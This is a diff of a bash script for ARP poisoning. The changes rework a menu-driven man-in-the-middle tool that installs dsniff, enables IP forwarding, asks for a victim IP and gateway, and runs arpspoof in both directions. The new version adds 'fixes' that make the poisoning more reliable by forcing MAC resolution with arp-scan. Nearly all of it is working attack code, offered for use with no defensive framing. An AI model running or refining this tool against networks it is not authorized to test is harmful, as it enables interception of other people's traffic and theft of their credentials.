@@ -1,221 +1,128 @@
 #!/usr/bin/bash
 
-# ▄▄▄       ██▀███   ██▓███      ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ ▓█████  ██▀███  
-#▒████▄    ▓██ ▒ ██▒▓██░  ██▒   ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
-#▒██  ▀█▄  ▓██ ░▄█ ▒▓██░ ██▓▒   ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
-#░██▄▄▄▄██ ▒██▀▀█▄  ▒██▄█▓▒ ▒   ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
-# ▓█   ▓██▒░██▓ ▒██▒▒██▒ ░  ░   ▒██▒ ░  ░░ ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░   ▓██░░▒████▒░██▓ ▒██▒
-# ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒▓▒░ ░  ░   ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
-# ▒   ▒▒ ░  ░▒ ░ ▒░░▒ ░        ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
-# ░   ▒     ░░   ░ ░░          ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░    ░     ░░   ░ 
-#     ░  ░   ░                              ░ ░   ░        ░      ░ ░           ░    ░  ░   ░     
-# Developed by Buccioz
-
-#font
+# Developed by HHY 
+# font
 bold=$(tput bold)
 normal=$(tput sgr0)
 
-#colors                                                                                        
+# colors                                                                                        
 NC='\033[0m'
 Red='\033[0;91m'
 Cyan='\033[0;96m'
 Green='\033[0;92m'
 Purple='\033[0;95m'
 
-#loading animation
- spinner() {
-	local i sp n
-	sp='/-\|'
-	n=${#sp}
-	printf ' '
-	while sleep 0.1; do
-		printf "%s\b" "${sp:i++%n:1}"
-	done
-	
+spinner() {
+    local i sp n
+    sp='/-\|'
+    n=${#sp}
+    printf ' '
+    while sleep 0.1; do
+        printf "%s\b" "${sp:i++%n:1}"
+    done
 }
 
-
-#forcing running as root-----------------------------------------------------------------------
-root() {	 
- clear
- if [ "$EUID" -ne 0 ]
-	 
-  then echo -e "${Red}${bold}Not running as root...${NC}${normal}";
-  echo "" ;
-  sudo "$0" "$@"
-  exit
-  fi
+root() {     
+    clear
+    if [ "$EUID" -ne 0 ]; then 
+        echo -e "${Red}${bold}Not running as root...${NC}${normal}";
+        echo "" ;
+        sudo "$0" "$@"
+        exit
+    fi
 }
-#requirements-------------------------------------------------------------------
+
 requirements() {
-echo -e "${Green}${bold}Checking the requirements...${NC}${normal}";
- 
-  spinner&
-        
-        sleep 3
-
-  kill "$!"
-  clear
- echo -e "${Green}${bold}Upgrading Net-Tools...${NC}${normal}";
- sleep 1
- echo
- echo -e "${Green}${bold}Downloading Sniffing Tools...${NC}${normal}";
-
-  chmod +x ./requirements.sh
- sudo xterm ./requirements.sh
-
- echo
-
- echo -e "${Green}${bold}Enabling IP Forwarding...${NC}${normal}"; 
- sudo echo 1 > /proc/sys/net/ipv4/ip_forward	
-
-spinner&
-	sleep 3
-	kill "$!"
- 
+    echo -e "${Green}${bold}Checking and installing requirements...${NC}${normal}";
+    sudo apt-get update > /dev/null
+    sudo apt-get install -y xterm dsniff arp-scan net-tools > /dev/null
+    
+    echo -e "${Green}${bold}Enabling IP Forwarding...${NC}${normal}"; 
+    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
 }
-#Print Net-Stats----------------------------------------------------------
+
 netstats() {
- printf "${Purple}"
- echo
- echo
- echo -e "${bold}----[Net-Stats]----"
- echo
- sudo ip addr | awk '
-/^[0-9]+:/ { 
-  sub(/:/,"",$2); iface=$2 } 
-/^[[:space:]]*inet / { 
-  split($2, a, "/")
-  print iface" : "a[1] 
-}'
-
- IP=$(/sbin/ip route | awk '/default/ { print $3 }')
- echo "Default Gateway : $IP ${normal}"
- 
-
-echo
+    printf "${Purple}"
+    echo -e "${bold}----[Net-Stats]----"
+    echo
+    sudo ip addr | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print iface" : "a[1] }'
+    IP=$(/sbin/ip route | awk '/default/ { print $3 }' | head -n 1)
+    echo "Default Gateway : $IP ${normal}"
+    echo
 }
 
 backmenu() {
-read -r -p 'Press 1 to return to main menu...' responsecl
-			  echo    
-			  case "$responsecl" in 
-			  ([1])
-                           clear
-			  main
-			  ;;
-			 *)
-
-			  echo "U stoopid ?...i said 1" 
-                           sleep 2
-                           clear
-                           main
-                           esac
-}
-#------------------------------------------------------------------------------------ 
-main() {
-   chmod +x ./banner.sh
-  ./banner.sh
-
-  netstats
-
-#Menu---------------------------------------------
-printf "${Purple}${bold}"
-PS3=': '
-options=("Poison" "Arp Table" "Hosts Scan" "Quit")
-select opt in "${options[@]}"
-do
-    case $opt in
-        "Poison")
-            clear
-            echo -e "${Purple}${bold}Poisoning ARPs...${normal}";
-            echo
-         spinner&
-	 sleep 2
-	 kill "$!"
-         clear
-         ./banner.sh
-
-         netstats
-         printf "${Purple}${bold}"
-         read -p 'Interface (eth0 - lo - wlan0): ' inter
-         echo
-         read -p 'Victim IP: ' vict
-         echo
-         read -p 'Default Gateway: ' gate
-         echo
-         echo "Stop sniffing...U addicted as hell!"
-         sudo xterm -e arpspoof -i $inter -t $vict -r $gate &sudo xterm -e arpspoof -i $inter -t $gate -r $vict 
-         wait
-         echo
-         backmenu
-            ;;
-
-        "Arp Table")
-           clear
-           echo -e "${Purple}${bold}Caching ARPs...${normal}";
-
-         echo
-         spinner&
-	 sleep 2
-	 kill "$!"
-
-         clear
-         ./banner.sh
-
-         netstats
-       
-         printf "${Purple}${bold}"
-         sudo arp -a 
-         echo
-         backmenu
-         
-            ;;
-
-        "Hosts Scan")
-            clear
-            echo -e "${Purple}${bold}Scanning for Hosts...${normal}";
-
-            echo
-         spinner&
-	 sleep 2
-	 kill "$!"
-         clear
-         ./banner.sh
-         netstats
-         printf "${Purple}${bold}"
-         read -p 'Interface (eth0 - wlan0): ' scanint
-         echo
-         sudo arp-scan --interface=$scanint --localnet
-         echo
-         wait
-         echo
-         backmenu
-           ;;
-
-        "Quit")
-            clear
-            exit
-            ;;
-
-        *) clear
-           echo "Invalid option...Reboot"
-           sleep 2
-           clear
-           main
-           ;;
+    read -r -p 'Press 1 to return to main menu...' responsecl
+    case "$responsecl" in 
+        ([1]) clear; main ;;
+        (*) sleep 1; clear; main ;;
     esac
-done
-
 }
 
-   root
-   requirements	   
-   clear
-   main
+main() {
+    chmod +x ./banner.sh
+    ./banner.sh
+    netstats
 
+    printf "${Purple}${bold}"
+    PS3=': '
+    options=("Poison" "Arp Table" "Hosts Scan" "Quit")
+    select opt in "${options[@]}"
+    do
+        case $opt in
+            "Poison")
+                clear
+                ./banner.sh
+                netstats
+                printf "${Purple}${bold}"
+                read -p 'Interface (e.g., wlp3s0): ' inter
+                read -p 'Victim IP: ' vict
+                read -p 'Default Gateway: ' gate
+                
+                # --- FIX 1: Clean spaces from input ---
+                inter=$(echo "$inter" | xargs)
+                vict=$(echo "$vict" | xargs)
+                gate=$(echo "$gate" | xargs)
+                
+                # --- FIX 2: Force MAC resolution using arp-scan ---
+                # Standard pings often fail; arp-scan is more reliable for "quiet" hosts
+                echo -e "${Cyan}Forcing MAC resolution for $vict...${NC}"
+                sudo arp-scan --interface="$inter" "$vict" --quiet --retry=5 > /dev/null
+                sudo arp-scan --interface="$inter" "$gate" --quiet --retry=5 > /dev/null
+                
+                echo
+                echo "Poisoning active. Close the new window to stop."
+                
+                # --- FIX 3: Single window poisoning with -r and -hold ---
+                # Using one window with -r is more stable than two separate windows
+                sudo xterm -hold -T "Poisoning $vict" -e arpspoof -i "$inter" -t "$vict" -r "$gate" &
+                
+                wait
+                backmenu
+            ;;
+            "Arp Table")
+                clear
+                ./banner.sh
+                netstats
+                sudo arp -a 
+                backmenu
+            ;;
+            "Hosts Scan")
+                clear
+                ./banner.sh
+                netstats
+                read -p 'Interface: ' scanint
+                scanint=$(echo "$scanint" | xargs)
+                sudo arp-scan --interface="$scanint" --localnet
+                backmenu
+            ;;
+            "Quit") clear; exit ;;
+            *) echo "Invalid option"; sleep 1; clear; main ;;
+        esac
+    done
+}
 
-
-
-
-
+root
+requirements       
+clear
+main
